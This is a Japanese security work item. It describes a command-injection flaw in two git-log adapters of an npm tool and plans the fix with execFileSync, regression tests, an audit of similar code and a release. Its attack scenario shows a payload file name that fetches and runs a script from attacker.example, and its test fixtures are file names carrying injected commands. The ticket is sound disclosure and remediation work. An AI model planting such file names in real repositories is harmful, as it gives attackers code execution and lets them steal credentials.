---
id: WI-035
type: fix
severity: high
status: tested
affects: [phase2-extensions]
---

# WI-035: phase2-extensions の git-log アダプタにおけるコマンドインジェクション脆弱性 (HIGH)

> 起票日: 2026-05-07
> 検出経緯: `/security-review` による全体監査
> CVSS 概算: 7.5–8.5（Local + User Interaction、Confidentiality/Integrity High）

## 背景

`/security-review` で `phase2-extensions` の git アダプタ 2 箇所に **コマンドインジェクション脆弱性 (HIGH)** を検出。`execSync` がテンプレート文字列でシェルコマンドを組み立て、ファイルパスをダブルクオート内に展開しているため、ファイル名に `$()` / バッククオート / `;` 等のシェルメタ文字が含まれていれば任意コードが実行される。

### 該当箇所

**1) `scripts/harness/phase2-extensions/infrastructure/adapters/git-log-document-age-adapter.ts:28`**

```ts
this.gitLogExecutor(
  `git log --format=%ai -1 -- "${documentPath}"`,
  { cwd: this.projectRoot, ... }
)
```

**2) `scripts/harness/phase2-extensions/infrastructure/adapters/git-log-initial-creation-age-adapter.ts:29-30`**

```ts
execSync(`git log --diff-filter=A --format=%ai -- "${filePath}"`, ...)
execSync(`git rev-list --count HEAD -- "${filePath}"`, ...)
```

### 根本原因

- `execSync` は文字列引数を渡すと `/bin/sh -c` 経由で実行される
- POSIX のダブルクオートは `"` / `;` / `&` / `|` / `$()` / `` ` `` を依然として解釈する
- `documentPath` / `filePath` は `FileSystemDocumentScannerAdapter.scan()` が `fs.readdir` で実ディスクを走査して返した値で、`toPatternRegex` のグロブマッチャは `$` `` ` `` `"` `;` `(` `)` `&` `|` 空白を除外していない
- Linux/macOS は上記文字を含むファイル名を許容し、git も問題なく clone する

### 攻撃シナリオ

1. 攻撃者が公開リポジトリに `docs/foo$(curl -sSf attacker.example/x.sh|sh).md` のようなファイルを配置（`git push` で完結。GitHub Web UI を介さず CLI なら任意の POSIX ファイル名が許容される）
2. 被害者がリポジトリを clone（または PR を `gh pr checkout` してローカルに展開した時点でも成立。**マージは不要**）
3. 被害者が以下のいずれかを実行:
   - `npx phasegate p2:check-freshness`
   - `npx phasegate p2:check-initial-creation`
   - `doc-freshness-checker` スキル
4. ウォーカーが該当ファイル名を返し、アダプタで上記シェル文字列が組み立てられ、`git` 起動前に `$(...)` がシェル評価される
5. **phasegate を実行したユーザ権限で任意コードが実行される**（SSH 鍵 / npm token / git 認証情報の漏洩、CI ランナーへのピボット）

### 攻撃者側のコスト

- 公開リポジトリを 1 つ作るだけで成立。npm 公開ツールの被害母数に対し攻撃コストは極めて低い
- PR 経由の場合、ファイル名が PR diff に表示されるためレビューで気付ける可能性はあるが、深いネスト / 大規模 PR では見落とし得る

## 本 WI でやること

### Phase 1: 修正実装（`quick-implementor` 推奨）

1. `git-log-document-age-adapter.ts:28` を `execFileSync` に置換:
   ```ts
   execFileSync(
     'git',
     ['log', '--format=%ai', '-1', '--', documentPath],
     { cwd: this.projectRoot, stdio: ['pipe', 'pipe', 'pipe'] }
   )
   ```

2. `git-log-initial-creation-age-adapter.ts:29-30` の 2 箇所を `execFileSync` に置換:
   ```ts
   execFileSync('git', ['log', '--diff-filter=A', '--format=%ai', '--', filePath], {...})
   execFileSync('git', ['rev-list', '--count', 'HEAD', '--', filePath], {...})
   ```

3. `gitLogExecutor` インジェクション型の signature を `(command: string) => Buffer` から `(file: string, args: readonly string[], options) => Buffer` に変更（テスタビリティ維持のため DI ポートは残す）

### Phase 2: テスト追加

1. **悪意あるファイル名でも RCE が発生しないこと** を assert する unit test:
   - ファイル名 `` foo`echo PWNED`.md `` / `foo$(echo PWNED).md` / `foo;echo PWNED.md` / `foo".md` 等を fixture として用意
   - アダプタを呼び出し、`PWNED` が標準出力 / 副作用ファイルに現れないことを確認
2. 正常系テスト（既存）を `execFileSync` 形式でも通ること

### Phase 3: 横展開監査

1. コードベース全体で `execSync(\`...${...}...\`)` パターンを grep
2. 同種の sink がある場合は同じ WI で修正、もしくは follow-up WI を起票
3. 既知の安全箇所（静的文字列のみ、レジストリ由来の信頼値）は `// safe: <理由>` コメントを残すかドキュメント化

#### 2026-05-07 監査結果

非テストコード `scripts/harness/**/*.ts` を `execSync(\`...${...}\`)` パターンで grep した結果:

- ✅ 本 WI 対象 2 ファイル（`phase2-extensions/.../git-log-document-age-adapter.ts`, `git-log-initial-creation-age-adapter.ts`）
- ⚠️ **follow-up**: `scripts/harness/skill-quality/infrastructure/adapters/git-commit-executor-adapter.ts:14`
  ```ts
  execSync(`git commit -m ${JSON.stringify(message)}`, { stdio: 'pipe' });
  ```
  `JSON.stringify` はバッククオート / `$` をエスケープしないため、`message` が外部入力に由来すると `/bin/sh -c` 経由で評価される可能性。`affects: [phase2-extensions]` のスコープ外のため、**WI-036 として起票済み**（`docs/inception/_cross/WI-036/description.md`）。

### Phase 4: リリース

1. minor バージョン bump（例 `0.113.0` → `0.114.0`）
2. CHANGELOG に **Security Fix** として明記
3. `npm publish --auth-type=web` で公開
4. 必要なら GitHub Security Advisory（GHSA）発行を検討

## 受け入れ基準

- [ ] `git-log-document-age-adapter.ts` の `execSync` テンプレート文字列が `execFileSync` 配列引数形式に置換される
- [ ] `git-log-initial-creation-age-adapter.ts` の `execSync` 2 箇所が `execFileSync` 配列引数形式に置換される
- [ ] 悪意あるファイル名（`$()` / バッククオート / `;` / `"` 含む）で RCE が発生しないことを assert する unit test が追加される
- [ ] 既存の正常系テストが全て通る
- [ ] `phasegate validate --layer L4` / `p2:check-freshness` / `p2:check-initial-creation` の動作が変わらない（後方互換）
- [ ] `execSync(\`...${var}...\`)` パターンの全体監査結果が WI 内 or follow-up WI に記録される
- [ ] CHANGELOG に Security Fix として明記される
- [ ] minor version bump + npm publish 完了

## スコープ外

- L0 hook 経由のコマンドインジェクション監査（別 WI、または本 WI Phase 3 で「該当なし」を確認した場合のみ closeable）
- ファイル名そのものに対するバリデーション層の追加（fix そのものは `execFileSync` 化で十分。深層防御として別 WI で検討する案）
- GHSA 発行プロセスの整備（運用 WI）

## 関連

- `scripts/harness/phase2-extensions/infrastructure/adapters/git-log-document-age-adapter.ts:23-30`
- `scripts/harness/phase2-extensions/infrastructure/adapters/git-log-initial-creation-age-adapter.ts:25-32`
- `scripts/harness/phase2-extensions/infrastructure/adapters/file-system-document-scanner-adapter.ts`（攻撃者制御値の起点）
- `scripts/harness/phase2-extensions/composition-root.ts`（両アダプタの wiring）
- `scripts/harness/main.ts:1186, 1213`（`p2:*` CLI dispatch）

## 参考

- Node.js docs: [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) — 配列引数 + `shell: false` (default) でメタ文字が無害化される
- OWASP: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
